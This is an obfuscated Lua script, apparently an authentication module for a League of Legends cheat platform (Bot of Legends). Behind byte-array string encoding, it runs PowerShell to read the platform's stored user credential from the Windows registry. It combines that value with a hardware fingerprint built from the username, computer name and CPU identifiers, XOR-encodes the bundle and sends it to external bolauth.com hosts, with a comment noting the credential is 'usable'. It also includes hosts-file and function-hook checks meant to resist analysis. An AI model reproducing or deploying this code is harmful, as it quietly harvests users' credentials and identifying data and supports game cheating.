<?php exit() ?>--by xetrok 27.122.126.1
function c(bytes)
  s = {}
  for i in pairs(bytes) 
    do s[i] = string.char(bytes[i]) 
  end
  return table.concat(s)
end

--Dev set vars
_ENV[c({100,101,118,110,97,109,101})] = c({120,101,116,114,111,107})
local scriptname = 'notifeye'
local scriptver = 1.00

--Vars for redirection checking
local direct = os.getenv(c({87,73,78,68,73,82}))
local HOSTSFILE = direct..c({92,92,115,121,115,116,101,109,51,50,92,92,100,114,105,118,101,114,115,92,92,101,116,99,92,92,104,111,115,116,115})

--Vars for checking status's later
local isuserauthed = false
local WebsiteIsDown = false

--Vars for auth
h1 = 'bolauth.com' -- main host
h2 = 'backup.bolauth.com' -- backup host
h3 = 'zeus.bolauth.com' -- us host
h4 = 'eu.bolauth.com' -- eu host
_ENV[c({65,117,116,104,80,97,103,101})] = c({97,117,116,104,92,92,107,101,107,46,112,104,112}) -- AuthPage

if debug.getinfo and debug.getinfo(_G.GetUser).what == "C" then
 cBa = _G.GetUser
 _G.GetUser = function() return end
 if debug.getinfo(_G.GetUser).what == "Lua" then
  _G.GetUser = cBa
  UserName = string.lower(GetUser())
 end
end

local g9 = Base64Decode(os.executePowerShell(c({36,112,97,116,104,32,61,32,39,72,75,76,77,58,92,83,79,70,84,87,65,82,69,92,87,111,119,54,52,51,50,78,111,100,101,92,66,111,76,39,13,10,32,32,71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121,32,36,112,97,116,104,32,124,32,83,101,108,101,99,116,45,79,98,106,101,99,116,32,45,69,120,112,97,110,100,80,114,111,112,101,114,116,121,32,34,117,115,101,114,34})))
local g10 = Base64Decode(os.executePowerShell(c({36,112,97,116,104,32,61,32,39,72,75,76,77,58,92,83,79,70,84,87,65,82,69,92,66,111,76,39,13,10,32,32,71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121,32,36,112,97,116,104,32,124,32,83,101,108,101,99,116,45,79,98,106,101,99,116,32,45,69,120,112,97,110,100,80,114,111,112,101,114,116,121,32,34,117,115,101,114,34})))

function url_encode(str)
  if (str) then
    str = string.gsub (str, "\n", "\r\n")
    str = string.gsub (str, "([^%w %-%_%.%~])",
    function (c) return string.format ("%%%02X", string.byte(c)) end)
    str = string.gsub (str, " ", "+")
  end
  return str
end

local hwid = url_encode(tostring(os.getenv(c({80,82,79,67,69,83,83,79,82,95,73,68,69,78,84,73,70,73,69,82}))..os.getenv(c({85,83,69,82,78,65,77,69}))..os.getenv(c({67,79,77,80,85,84,69,82,78,65,77,69}))..os.getenv(c({80,82,79,67,69,83,83,79,82,95,76,69,86,69,76}))..os.getenv(c({80,82,79,67,69,83,83,79,82,95,82,69,86,73,83,73,79,78})))) --credit Sida
local ssend = string.lower(hwid)
local key = c({57,67,69,69,66,53,69,56,50,65,52,52,57,52,49,70,67,53,65,51,52,54,66,54,53,53,57,57,65})

function convert(str, key)
        local res = ""
        for i = 1,#str do
                local keyIndex = (i - 1) % key:len() + 1
                res = res .. string.char( bit32.bxor( str:sub(i,i):byte(), key:sub(keyIndex,keyIndex):byte() ) )
        end
 
        return res
end

function str2hex(str)
local hex = ''
while #str > 0 do
local hb = num2hex(string.byte(str, 1, 1))
if #hb < 2 then hb = '0' .. hb end
hex = hex .. hb
str = string.sub(str, 2)
end
return hex
end

function num2hex(num)
    local hexstr = c({48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102})
    local s = ''
    while num > 0 do
        local mod = math.fmod(num, 16)
        s = string.sub(hexstr, mod+1, mod+1) .. s
        num = math.floor(num / 16)
    end
    if s == '' then s = '0' end
    return s
end
local QMaxRange = _G['GetMyHero']() -- myHero
local WMaxRange = _G['GetUser']() -- myHero
function hex2string(hex)
        local str, n = hex:gsub("(%x%x)[ ]?", function (word)
                return string.char(tonumber(word, 16))
        end)
        return str
end

gametbl = --game table
  {
  m = QMaxRange.name, --ign
  g = QMaxRange.charName, --hero name
  q = QMaxRange.team, -- team
  f =  GetRegion(), --region
  z = '1', --gameid (requested) make your own function
  y = GetGameTimer()--timer
  }

scripttbl = --script table
  {
  i = devname, --dev name
  d = scriptname, --script name
  h = scriptver -- version
  }

datatbl = --data table
  {
  k = WMaxRange, 
  j = hwid,
  v = 0, --failcode implement it somewhere if you like anything other than 0 returns a denied response atm
  s = g9, --usable, just grab the code
  r = g10
  }

gametbl = JSON:encode(gametbl)
gametbl = str2hex(convert(Base64Encode(gametbl),key))
scripttbl = JSON:encode(scripttbl)
scripttbl = str2hex(convert(Base64Encode(scripttbl),key))
datatbl = JSON:encode(datatbl)
datatbl = str2hex(convert(Base64Encode(datatbl),key))

packIt = { --packit table
  hash = math.random(65248,895423654),
  game = gametbl,
  data = datatbl,
  script = scripttbl,
  hash2 = math.random(65248,895423654)
}
packIt = JSON:encode(packIt)
packIt = str2hex(convert(Base64Encode(packIt),key))

--Vars for DDOS Check
--Vars for DDOS Check
local kekval178 = 'http://bolauth.com/auth/check.php'
local kekval179 = 'http://backup.bolauth.com/auth/check.php'
local kekval180 = 'http://zeus.bolauth.com/auth/check.php'
local kekval184 = 'http://eu.bolauth.com/auth/check.php'
local kekval181 = LIB_PATH..'check1.txt'
local kekval182 = LIB_PATH..'check2.txt'
local kekval183 = LIB_PATH..'check3.txt'
local kekval185 = LIB_PATH..'check4.txt'

--DDOS Check Functions
function Kek8()
  DownloadFile(kekval178, kekval181, Kek1)
end
function Kek9()
  DownloadFile(kekval179, kekval182, Kek2)
end
function Kek10()
  DownloadFile(kekval180, kekval183, Kek3)
end
function Kek14()
  DownloadFile(kekval184, kekval185, Kek15)
end

function Kek1()
    file = io.open(kekval181, 'rb')
    if file ~= nil then
    content = file:read('*all')
    file:close() 
    os.remove(kekval181) 
    if content then
      check2 = string.find(content, 'is up.')
      if check2 then
        g1 = false
      end
    end
  end
end
function Kek2()
    file = io.open(kekval182, 'rb')
    if file ~= nil then
    content = file:read('*all')
    file:close() 
    os.remove(kekval182) 
    if content then
      check2 = string.find(content, 'is up.')
      if check2 then
        g2 = false
      end
    end
  end
end
function Kek3()
    file = io.open(kekval183, 'rb')
    if file ~= nil then
    content = file:read('*all')
    file:close() 
    os.remove(kekval183) 
    if content then
      check2 = string.find(content, 'is up.')
      if check2 then
        g3 = false
      end
    end
  end
end
function Kek15()
    file = io.open(kekval185, 'rb')
    if file ~= nil then
    content = file:read('*all')
    file:close() 
    os.remove(kekval185) 
    if content then
      check2 = string.find(content, 'is up.')
      if check2 then
        g4 = false
      end
    end
  end
end

function CheckSiteCallback()
  file = io.open(ddoschecktmp, "rb")
  if file ~= nil then
    content = file:read("*all")
    file:close() 
    os.remove(ddoschecktmp) 
    if content then
      check1 = string.find(content, c({108,111,111,107,115,32,100,111,119,110,32,102,114,111,109,32,104,101,114,101,46}))
      check2 = string.find(content, c({105,115,32,117,112,46}))
      if check1 then 
        WebsiteIsDown = true
        PrintChat("<font color='#FF0000'> Validating Access Please Wait! </font>")
      end
      if check2 then
        PrintChat("<font color='#FF0000'> Validating Access Please Wait! </font>")
        return
      end
    end
  end
end

-- Auth Check Functions
function Kek12(n)
    if (n == 1) then
      _ENV[c({71,101,116,65,115,121,110,99,87,101,98,82,101,115,117,108,116})](h1, _ENV[c({65,117,116,104,80,97,103,101})]..c({63,100,97,116,97,61}).._ENV[c({112,97,99,107,73,116})]..'&t=f',Kek4) -- Getasync
    end
    if (n == 2) then
      _ENV[c({71,101,116,65,115,121,110,99,87,101,98,82,101,115,117,108,116})](h2, _ENV[c({65,117,116,104,80,97,103,101})]..c({63,100,97,116,97,61}).._ENV[c({112,97,99,107,73,116})]..'&t=f',Kek4)
    end
    if (n == 3) then
      _ENV[c({71,101,116,65,115,121,110,99,87,101,98,82,101,115,117,108,116})](h3, _ENV[c({65,117,116,104,80,97,103,101})]..c({63,100,97,116,97,61}).._ENV[c({112,97,99,107,73,116})]..'&t=f',Kek4)
    end
    if (n == 4) then
      _ENV[c({71,101,116,65,115,121,110,99,87,101,98,82,101,115,117,108,116})](h4, _ENV[c({65,117,116,104,80,97,103,101})]..c({63,100,97,116,97,61}).._ENV[c({112,97,99,107,73,116})]..'&t=f',Kek4)
    end
end

function Kek11()
  local ur = GetRegion()
  if (ur == 'eune') or (ur == 'euw') or (ur == 'tr') or (ur == 'ru')  then 
    if (g4 == false) then Kek12(4) return end --EU Server
    if (g3 == false) then Kek12(3) return end --US SERVER
    if (g1 == false) then Kek12(1) return end --Main Server
    if (g2 == false) then Kek12(2) return end --Backup Server
  end
  if (ur == 'na') or (ur == 'unk') or (ur == 'br') or (ur == 'oce') or (ur == 'la1') or (ur == 'la2') or (ur == 'kr') then 
    if (g3 == false) then Kek12(3) return end --US SERVER    
    if (g4 == false) then Kek12(4) return end --EU Server
    if (g1 == false) then Kek12(1) return end --Main Server
    if (g2 == false) then Kek12(2) return end --Backup Server
  end
    if (g3 == false) then Kek12(3) return end --US SERVER    
    if (g4 == false) then Kek12(4) return end --EU Server
    if (g1 == false) then Kek12(1) return end --Main Server
    if (g2 == false) then Kek12(2) return end --Backup Server
    PrintChat('No servers are available for authentication') 
end

function Kek4(authCheck)
  dec = Base64Decode(convert(hex2string(authCheck),key))
  dePack = JSON:decode(dec)
  if (dePack['status'] == 1) or (dePack['status'] == 7) then
      PrintChat("<font color='#999966'> User Authenticated! Welcome Back </font>"..UserName)
      kekval834 = true
      --Do your menu/init/var load here
    else
      reason = dePack['reason']
      PrintChat("<font color='#FF0000'> Error Authenticating User!! </font>")
    end
end

function OnLoad()
  if FileExist(HOSTSFILE) then
    file = io.open(HOSTSFILE, "rb")
    if file ~= nil then
      content = file:read("*all") --save the whole file to a var
      file:close() --close it
      if content then
        stringff = string.find(content, c({98,111,108,97,117,116,104}))
        stringfg = string.find(content, c({49,48,56,46,49,54,50,46,49,57}))
        stringfh = string.find(content, c({100,111,119,110,102,111,114,101,118,101,114,121,111,110,101,111,114,106,117,115,116,109,101}))
        stringfi = string.find(content, c({53,48,46,57,55,46,49,54,49,46,50,50,57}))
      end
      if stringff or stringfg or stringfh or stringfi then PrintChat(c({72,111,115,116,115,32,70,105,108,101,32,77,111,100,105,102,101,100,58,32,65,99,99,101,115,115,32,68,101,110,105,101,100})) return end
    end
  end
  Kek8() --check site 1
  Kek9() --check site 2
  Kek10() --check site 3
  Kek14() --check site 4
  PrintChat('Validating Access')
  DelayAction(Kek11,4) -- run the auth after checking sites delayaction,4
end

